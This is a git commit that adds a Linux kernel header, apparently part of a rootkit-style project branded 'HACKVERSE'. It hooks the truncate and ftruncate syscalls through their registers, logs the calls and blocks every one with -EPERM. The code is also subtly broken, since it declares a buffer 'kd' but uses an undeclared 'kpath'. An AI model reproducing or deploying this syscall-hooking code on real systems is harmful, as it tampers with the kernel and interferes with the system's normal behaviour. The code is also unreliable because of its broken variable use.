0a1d18377348be14ac62918ad375ef26e113f4a5
bypasser0x2 <140964510+devilzsecurity@users.noreply.github.com>
2025-10-06 20:28:53 +0530

    Create truncate.h

---
+++ hooks/truncate.h
@@ -0,0 +1,54 @@
+
+#ifndef TRUNCATE_HOOK_H
+#define TRUNCATE_HOOK_H
+
+#include <linux/kernel.h>
+#include <linux/uaccess.h>
+#include <linux/module.h>
+#include <linux/sched.h>
+
+// no need to look just look at the regs strcuture
+typedef asmlinkage long (*orig_truncate_t)(const struct pt_regs *);
+typedef asmlinkage long (*orig_ftruncate_t)(const struct pt_regs *);
+
+static orig_truncate_t orig_truncate = NULL; // holding area
+static orig_ftruncate_t orig_ftruncate = NULL;
+
+// main area  or our main logic of the hook
+asmlinkage long hook_truncate(const struct pt_regs *regs)
+{
+    char kd[256] = "";
+    const char __user *pathname = (const char __user *)regs->di;
+    unsigned long length = (unsigned long)regs->si;
+
+    if (pathname && strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) < 0)
+        kd[0] = '\0';
+
+
+    printk(KERN_INFO "====================================================\n");
+    printk(KERN_INFO "HACKVERSE HOOKED TRUNCATE\n");
+    //printk(KERN_INFO "@0xTrevo @Devil0x1\n");
+    printk(KERN_INFO "File: %s\n", kpath);
+    printk(KERN_INFO "Length: %lu\n", length);
+    printk(KERN_INFO "====================================================\n");
+
+    return -EPERM; // this returns an eror if someone tries to truncate a file this will be called for a reason we can check the docs for more type of this hehe
+}
+
+//  out ftruncate hook area easy hook not hard
+asmlinkage long hook_ftruncate(const struct pt_regs *regs)
+{
+    int fd = (int)regs->di;
+    unsigned long length = (unsigned long)regs->si;
+
+    printk(KERN_INFO "====================================================\n");
+    printk(KERN_INFO "HACKVERSE HOOKED FTRUNCATE\n");
+    //printk(KERN_INFO "@0xTrevo @Devil0x1\n");
+    printk(KERN_INFO "File Descriptor: %d\n", fd);
+    printk(KERN_INFO "Length: %lu\n", length);
+    printk(KERN_INFO "====================================================\n");
+
+    return -EPERM;
+}
+
+#endif
